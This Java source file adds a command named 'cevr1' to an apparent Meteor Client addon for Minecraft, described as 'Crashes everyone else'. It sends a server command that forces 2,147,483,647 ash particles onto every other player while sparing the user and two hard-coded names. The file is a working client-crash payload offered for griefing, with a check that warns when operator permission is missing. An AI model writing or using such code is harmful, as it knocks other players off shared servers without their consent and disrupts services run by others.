package spigey.asteroide.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.client.multiplayer.ClientSuggestionProvider;
import net.minecraft.server.permissions.Permission;
import net.minecraft.server.permissions.PermissionLevel;

public class CrashAll extends Command {
    public CrashAll() {
        super("cevr1", "Crashes everyone else");
    }

    @Override
    public void build(LiteralArgumentBuilder<ClientSuggestionProvider> builder) {
        builder.executes(context -> {
            String username = mc.getUser().getName();
            info("Attempting to crash everyone");
            assert mc.player != null;
            if(!mc.player.permissions().hasPermission(new Permission.HasCommandLevel(PermissionLevel.GAMEMASTERS))) error("You do not have the required permission level of 2, the crash will most likely not work!");
            ChatUtils.sendPlayerMsg("/execute at @a[name=!" + username +",name=!Spigey,name=!SkyFeiner] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!" + username + ",name=!Spigey,name=!SkyFeiner]");
            return SINGLE_SUCCESS;
        });
    }
}
